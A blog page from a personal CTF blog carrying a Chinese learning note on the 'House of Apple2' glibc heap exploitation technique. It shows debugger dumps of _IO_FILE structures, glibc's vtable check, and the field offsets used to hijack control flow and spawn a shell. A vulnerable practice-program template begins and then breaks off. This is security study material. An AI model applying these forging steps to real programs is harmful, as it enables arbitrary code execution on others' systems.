@@ -1,0 +1,689 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+
+    <!--[if lt IE 9]>
+        <style>body {display: none; background: none !important} </style>
+        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
+    <![endif]-->
+
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<meta name="format-detection" content="telephone=no" />
+<meta name="author" content="lexsd6" />
+
+
+
+<meta name="description" content="在libc2.35及以后，glibc将许多的hook都给移除了,例如malloc_hook,free_hook等，导致一些常见的许多堆攻击利用方式几乎都失效了。 高版本后，_IO_FILE 的伪造和对 IO 流的劫持基本上是堆工具的主流思路，但是菜鸡一直看不懂，最近沉下心来看了roderick 佬的文章貌似看懂了点于是小记一下。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="House of apple2 学习笔记">
+<meta property="og:url" content="lexsd6.github.io/2024/12/27/House%20of%20apple2%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/index.html">
+<meta property="og:site_name" content="lexsd6&#39;s home">
+<meta property="og:description" content="在libc2.35及以后，glibc将许多的hook都给移除了,例如malloc_hook,free_hook等，导致一些常见的许多堆攻击利用方式几乎都失效了。 高版本后，_IO_FILE 的伪造和对 IO 流的劫持基本上是堆工具的主流思路，但是菜鸡一直看不懂，最近沉下心来看了roderick 佬的文章貌似看懂了点于是小记一下。">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2024-12-27T15:46:30.712Z">
+<meta property="article:modified_time" content="2024-12-27T15:47:31.988Z">
+<meta property="article:author" content="lexsd6">
+<meta property="article:tag" content="pwn">
+<meta name="twitter:card" content="summary">
+
+<link rel="apple-touch-icon" href= "/apple-touch-icon.png">
+
+
+    <link rel="alternate" href="/atom.xml" title="lexsd6&#39;s home" type="application/atom+xml">
+
+
+
+    <link rel="shortcut icon" href="/title.ico">
+
+
+
+    <link href="//cdn.bootcss.com/animate.css/3.5.1/animate.min.css" rel="stylesheet">
+
+
+
+    <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet">
+
+
+
+    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+    <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">
+
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+
+
+
+<link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+
+
+<title>House of apple2 学习笔记 | lexsd6&#39;s home</title>
+
+<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+<script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+
+<script>
+    var yiliaConfig = {
+        fancybox: true,
+        animate: true,
+        isHome: false,
+        isPost: true,
+        isArchive: false,
+        isTag: false,
+        isCategory: false,
+        fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
+        scrollreveal: "//cdn.bootcss.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
+        search: true
+    }
+</script>
+
+
+
+    <script> yiliaConfig.jquery_ui = [false]; </script>
+
+
+
+    <script> yiliaConfig.rootUrl = "\/";</script>
+
+
+
+
+
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+<body>
+
+
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            <img src="/img/lexsd6.png" class="animated zoomIn">
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/">lexsd6</a></h1>
+        </hgroup>
+
+        
+        <p class="header-subtitle"> Clumsy birds have to start flying early</p>
+        
+
+        
+            <form id="search-form">
+            <input type="text" id="local-search-input" name="q" placeholder="search..." class="search form-control" autocomplete="off" autocorrect="off" searchonload="false" />
+            <i class="fa fa-times" onclick="resetSearch()"></i>
+            </form>
+            <div id="local-search-result"></div>
+            <p class='no-result'>No results found <i class='fa fa-spinner fa-pulse'></i></p>
+        
+
+
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        <div class="icon-wrap icon-link hide" data-idx="2">
+                            <div class="loopback_l"></div>
+                            <div class="loopback_r"></div>
+                        </div>
+                        
+                        
+                        <div class="icon-wrap icon-me hide" data-idx="3">
+                            <div class="user"></div>
+                            <div class="shoulder"></div>
+                        </div>
+                        
+                    </div>
+                    
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        <li>友情链接</li>
+                        
+                        
+                        <li>关于我</li>
+                        
+                    </ul>
+                </div>
+            </div>
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">主页</a></li>
+                        
+                            <li><a href="/archives/">所有文章</a></li>
+                        
+                            <li><a href="/tags/">标签云</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" href="mailto:lexsd6@foxmail.com" title="Email"></a>
+                            
+                                <a class="fa RSS" href="/atom.xml" title="RSS"></a>
+                            
+                                <a class="fa QQ" href="tencent://message/?uin=2927507170&Menu=yes" title="QQ"></a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/DragonBones/" rel="tag">DragonBones</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Linux/" rel="tag">Linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Machine/" rel="tag">Machine</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/c/" rel="tag">c#</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/code/" rel="tag">code</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/crypto/" rel="tag">crypto</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ida/" rel="tag">ida</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/libc/" rel="tag">libc</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/mics/" rel="tag">mics</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/mysql/" rel="tag">mysql</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/node-js/" rel="tag">node-js</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php/" rel="tag">php</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/problem-resolve/" rel="tag">problem_resolve</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/" rel="tag">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/re/" rel="tag">re</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ruby/" rel="tag">ruby</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sql/" rel="tag">sql</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/translate/" rel="tag">translate</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wp/" rel="tag">wp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/" rel="tag">应急响应</a></li></ul>
+                    </div>
+                </section>
+                
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a class="main-nav-link switch-friends-link" href="https://hexo.io" target="_blank" rel="noopener">Hexo</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="https://pages.github.com/" target="_blank" rel="noopener">GitHub</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://moxfive.xyz/" target="_blank" rel="noopener">MOxFIVE</a>
+                    
+                    </div>
+                </section>
+                
+
+                
+                
+                <section class="switch-part switch-part4">
+                
+                    <div id="js-aboutme">一梦想成为五边形战士的老菜鸡</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">lexsd6</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                <img src="/img/lexsd6.png" class="animated zoomIn">
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页">lexsd6</a></h1>
+            </hgroup>
+            
+            <p class="header-subtitle"> Clumsy birds have to start flying early</p>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">主页</a></li>
+                
+                    <li><a href="/archives/">所有文章</a></li>
+                
+                    <li><a href="/tags/">标签云</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" target="_blank" href="mailto:lexsd6@foxmail.com" title="Email"></a>
+                            
+                                <a class="fa RSS" target="_blank" href="/atom.xml" title="RSS"></a>
+                            
+                                <a class="fa QQ" target="_blank" href="tencent://message/?uin=2927507170&Menu=yes" title="QQ"></a>
+                            
+                        </ul>
+            </nav>
+        </header>                
+    </div>
+    <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
+</nav>
+      <div class="body-wrap">
+
+
+
+<article id="post-House of apple2 学习笔记" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2024/12/27/House%20of%20apple2%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="article-date">
+      <time datetime="2024-12-27T15:46:30.712Z" itemprop="datePublished">2024-12-27</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      House of apple2 学习笔记
+    </h1>
+  
+
+
+          <div style="margin-top:10px 0;margin-bottom:15px;">
+    <span class="post-time">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-keyboard-o"></i>
+        <span class="post-meta-item-text">  字数统计: </span>
+        <span class="post-count">1.8k字</span>
+      </span>
+    </span>
+    <span class="post-time">
+      &nbsp; | &nbsp;
+      <span class="post-meta-item-icon">
+        <i class="fa fa-hourglass-half"></i>
+        <span class="post-meta-item-text">阅读时长:</span>
+        <span class="post-count">9分</span>
+      </span>
+    </span>
+</div>
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             
+          
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+    <div class="article-category tagcloud">
+    <a class="article-category-link" href="/categories/CTF/">CTF</a>
+    </div>
+
+
+        
+    <div class="article-tag tagcloud" >
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li></ul>
+
+    </div>
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <p>在libc2.35及以后，glibc将许多的hook都给移除了,例如<strong>malloc_hook</strong>,<strong>free_hook</strong>等，导致一些常见的许多堆攻击利用方式几乎都失效了。 高版本后，_IO_FILE 的伪造和对 IO 流的劫持基本上是堆工具的主流思路，但是菜鸡一直看不懂，最近沉下心来看了roderick 佬的文章貌似看懂了点于是小记一下。<a id="more"></a></p>
+<h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><p>能控制程序执行 <code>IO</code> 操作，包括但不限于：从 <code>main</code> 函数返回、调用 <code>exit</code> 函数、通过<code>__malloc_assert</code> 触发</p>
+<p>已知 <code>heap</code> 地址和 <code>glibc</code> 地址</p>
+<p>能控制<code>_IO_FILE</code> 的 <code>vtable</code> 和<code>_wide_data</code>，一般使用 <code>largebin attack</code> 去控制</p>
+<h3 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h3><p><code>stdin/stdout/stderr</code> 这三个<code>_IO_FILE</code> 结构体使用的是<code>_IO_file_jumps</code> 这个 <code>vtable</code>。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p *(struct  _IO_FILE_plus *) <span class="built_in">stdin</span></span><br><span class="line">$<span class="number">4</span> = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = <span class="number">-72540021</span>,</span><br><span class="line">    _IO_read_ptr = <span class="number">0x7f3cb081cb23</span> &lt;_IO_2_1_stdin_+<span class="number">131</span>&gt; <span class="string">""</span>,</span><br><span class="line">    _IO_read_end = <span class="number">0x7f3cb081cb23</span> &lt;_IO_2_1_stdin_+<span class="number">131</span>&gt; <span class="string">""</span>,</span><br><span class="line">    _IO_read_base = <span class="number">0x7f3cb081cb23</span> &lt;_IO_2_1_stdin_+<span class="number">131</span>&gt; <span class="string">""</span>,</span><br><span class="line">    _IO_write_base = <span class="number">0x7f3cb081cb23</span> &lt;_IO_2_1_stdin_+<span class="number">131</span>&gt; <span class="string">""</span>,</span><br><span class="line">    _IO_write_ptr = <span class="number">0x7f3cb081cb23</span> &lt;_IO_2_1_stdin_+<span class="number">131</span>&gt; <span class="string">""</span>,</span><br><span class="line">    _IO_write_end = <span class="number">0x7f3cb081cb23</span> &lt;_IO_2_1_stdin_+<span class="number">131</span>&gt; <span class="string">""</span>,</span><br><span class="line">    _IO_buf_base = <span class="number">0x7f3cb081cb23</span> &lt;_IO_2_1_stdin_+<span class="number">131</span>&gt; <span class="string">""</span>,</span><br><span class="line">    _IO_buf_end = <span class="number">0x7f3cb081cb24</span> &lt;_IO_2_1_stdin_+<span class="number">132</span>&gt; <span class="string">""</span>,</span><br><span class="line">    _IO_save_base = <span class="number">0x0</span>,</span><br><span class="line">    _IO_backup_base = <span class="number">0x0</span>,</span><br><span class="line">    _IO_save_end = <span class="number">0x0</span>,</span><br><span class="line">    _markers = <span class="number">0x0</span>,</span><br><span class="line">    _chain = <span class="number">0x0</span>,</span><br><span class="line">    _fileno = <span class="number">0</span>,</span><br><span class="line">    _flags2 = <span class="number">0</span>,</span><br><span class="line">    _old_offset = <span class="number">-1</span>,</span><br><span class="line">    _cur_column = <span class="number">0</span>,</span><br><span class="line">    _vtable_offset = <span class="number">0</span> <span class="string">'\000'</span>,</span><br><span class="line">    _shortbuf = <span class="string">""</span>,</span><br><span class="line">    _lock = <span class="number">0x7f3cb081ea80</span> &lt;_IO_stdfile_0_lock&gt;,</span><br><span class="line">    _offset = <span class="number">-1</span>,</span><br><span class="line">    _codecvt = <span class="number">0x0</span>,</span><br><span class="line">    _wide_data = <span class="number">0x7f3cb081cb80</span> &lt;_IO_wide_data_0&gt;,</span><br><span class="line">    _freeres_list = <span class="number">0x0</span>,</span><br><span class="line">    _freeres_buf = <span class="number">0x0</span>,</span><br><span class="line">    __pad5 = <span class="number">0</span>,</span><br><span class="line">    _mode = <span class="number">0</span>,</span><br><span class="line">    _unused2 = <span class="string">'\000'</span> &lt;repeats <span class="number">19</span> times&gt;</span><br><span class="line">  &#125;,</span><br><span class="line">  vtable = <span class="number">0x7f3cb0819600</span> &lt;_IO_file_jumps&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>2.24以后的glibc中,这个 <code>vtable</code>会有一个IO_validate_vtable函数对其指向的地址进行检测，检测代码如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Perform vtable pointer validation.  If validation fails, terminate</span></span><br><span class="line"><span class="comment">   the process.  */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *</span></span><br><span class="line"><span class="class"><span class="title">IO_validate_vtable</span> (<span class="title">const</span> <span class="title">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="comment">/* Fast path: The vtable pointer is within the __libc_IO_vtables</span></span><br><span class="line"><span class="comment">     section.  */</span></span><br><span class="line">  <span class="keyword">uintptr_t</span> section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *ptr = (<span class="keyword">const</span> <span class="keyword">char</span> *) vtable;</span><br><span class="line">  <span class="keyword">uintptr_t</span> offset = ptr - __start___libc_IO_vtables;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (offset &gt;= section_length))</span><br><span class="line">    <span class="comment">/* The vtable pointer is not in the expected section.  Use the</span></span><br><span class="line"><span class="comment">       slow path, which will terminate the process if necessary.  */</span></span><br><span class="line">    _IO_vtable_check ();</span><br><span class="line">  <span class="keyword">return</span> vtable;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>stdin/stdout/stderr</code> 这三个<code>_IO_FILE</code> 结构体中有个 ``_wide_data`成员指向一个和FILE结构体十分相像的wide_data结构体。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p *(struct _IO_wide_data*) <span class="number">0x7f3cb081cb80</span></span><br><span class="line">$<span class="number">6</span> = &#123;</span><br><span class="line">  _IO_read_ptr = <span class="number">0x0</span>,</span><br><span class="line">  _IO_read_end = <span class="number">0x0</span>,</span><br><span class="line">  _IO_read_base = <span class="number">0x0</span>,</span><br><span class="line">  _IO_write_base = <span class="number">0x0</span>,</span><br><span class="line">  _IO_write_ptr = <span class="number">0x0</span>,</span><br><span class="line">  _IO_write_end = <span class="number">0x0</span>,</span><br><span class="line">  _IO_buf_base = <span class="number">0x0</span>,</span><br><span class="line">  _IO_buf_end = <span class="number">0x0</span>,</span><br><span class="line">  _IO_save_base = <span class="number">0x0</span>,</span><br><span class="line">  _IO_backup_base = <span class="number">0x0</span>,</span><br><span class="line">  _IO_save_end = <span class="number">0x0</span>,</span><br><span class="line">  _IO_state = &#123;</span><br><span class="line">    __count = <span class="number">0</span>,</span><br><span class="line">    __value = &#123;</span><br><span class="line">      __wch = <span class="number">0</span>,</span><br><span class="line">      __wchb = <span class="string">"\000\000\000"</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  _IO_last_state = &#123;</span><br><span class="line">    __count = <span class="number">0</span>,</span><br><span class="line">    __value = &#123;</span><br><span class="line">      __wch = <span class="number">0</span>,</span><br><span class="line">      __wchb = <span class="string">"\000\000\000"</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  _codecvt = &#123;</span><br><span class="line">    __cd_in = &#123;</span><br><span class="line">      <span class="built_in">step</span> = <span class="number">0x0</span>,</span><br><span class="line">      step_data = &#123;</span><br><span class="line">        __outbuf = <span class="number">0x0</span>,</span><br><span class="line">        __outbufend = <span class="number">0x0</span>,</span><br><span class="line">        __flags = <span class="number">0</span>,</span><br><span class="line">        __invocation_counter = <span class="number">0</span>,</span><br><span class="line">        __internal_use = <span class="number">0</span>,</span><br><span class="line">        __statep = <span class="number">0x0</span>,</span><br><span class="line">        __state = &#123;</span><br><span class="line">          __count = <span class="number">0</span>,</span><br><span class="line">          __value = &#123;</span><br><span class="line">            __wch = <span class="number">0</span>,</span><br><span class="line">            __wchb = <span class="string">"\000\000\000"</span></span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    __cd_out = &#123;</span><br><span class="line">      <span class="built_in">step</span> = <span class="number">0x0</span>,</span><br><span class="line">      step_data = &#123;</span><br><span class="line">        __outbuf = <span class="number">0x0</span>,</span><br><span class="line">        __outbufend = <span class="number">0x0</span>,</span><br><span class="line">        __flags = <span class="number">0</span>,</span><br><span class="line">        __invocation_counter = <span class="number">0</span>,</span><br><span class="line">        __internal_use = <span class="number">0</span>,</span><br><span class="line">        __statep = <span class="number">0x0</span>,</span><br><span class="line">        __state = &#123;</span><br><span class="line">          __count = <span class="number">0</span>,</span><br><span class="line">          __value = &#123;</span><br><span class="line">            __wch = <span class="number">0</span>,</span><br><span class="line">            __wchb = <span class="string">"\000\000\000"</span></span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  _shortbuf = <span class="string">L""</span>,</span><br><span class="line">  _wide_vtable = <span class="number">0x7f3cb08190c0</span> &lt;_IO_wfile_jumps&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>两个结构体，都有一个虚表，但是_IO_wfile_jumps 没有进行检查保护，这意味着我们可以把它劫持到我们伪造的虚表，从而控制执行流。</p>
+<h3 id="利用-IO-wfile-overflow-函数控制程序执行流"><a href="#利用-IO-wfile-overflow-函数控制程序执行流" class="headerlink" title="利用_IO_wfile_overflow 函数控制程序执行流"></a>利用_IO_wfile_overflow 函数控制程序执行流</h3><p>对 <code>fp</code> 的设置如下：</p>
+<ul>
+<li><p><code>_flags</code> 设置为 <code>~(2 | 0x8 | 0x800)</code>，如果不需要控制 <code>rdi</code>，设置为 <code>0</code> 即可；如果需要获得 <code>shell</code>，可设置为<code>sh;</code>，注意前面有两个空格</p>
+</li>
+<li><p><code>vtable</code> 设置为<code>_IO_wfile_jumps/_IO_wfile_jumps_mmap/_IO_wfile_jumps_maybe_mmap</code> 地址（加减偏移），使其能成功调用<code>_IO_wfile_overflow</code> 即可</p>
+</li>
+<li><p><code>_wide_data</code> 设置为可控堆地址 <code>A</code>，即满足 <code>*(fp + 0xa0) = A</code></p>
+</li>
+<li><p><code>_wide_data-&gt;_IO_write_base</code> 设置为 <code>0</code>，即满足 <code>*(A + 0x18) = 0</code></p>
+</li>
+<li><p><code>_wide_data-&gt;_IO_buf_base</code> 设置为 <code>0</code>，即满足 <code>*(A + 0x30) = 0</code></p>
+</li>
+<li><p><code>_wide_data-&gt;_wide_vtable</code> 设置为可控堆地址 <code>B</code>，即满足 <code>*(A + 0xe0) = B</code></p>
+</li>
+<li><p><code>_wide_data-&gt;_wide_vtable-&gt;doallocate</code> 设置为地址 <code>C</code> 用于劫持 <code>RIP</code>，即满足 <code>*(B + 0x68) = C</code></p>
+<p>函数的调用链如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">_IO_wfile_overflow</span><br><span class="line">    _IO_wdoallocbuf</span><br><span class="line">        _IO_WDOALLOCATE</span><br><span class="line">            *(fp-&gt;_wide_data-&gt;_wide_vtable + 0x68)(fp)</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<h2 id="例子思路"><a href="#例子思路" class="headerlink" title="例子思路"></a>例子思路</h2><ol>
+<li>利用largebin attack向IO_list_all里面写入一个可控的堆地址</li>
+<li>在这个堆块里面同时伪造一个_IO_list_all结构体和IO_wide_data结构体，以及他们对应的vtable指针</li>
+<li>_IO_list_all结构体的vtable指针指向 _IO_wfile_jumps来绕过检查，而 _wide_data的结构体指向我们伪造的虚表即可</li>
+</ol>
+<p>模版：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> num 80</span></span><br><span class="line"><span class="keyword">void</span> *chunk_list[num];</span><br><span class="line"><span class="keyword">int</span> chunk_size[num];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    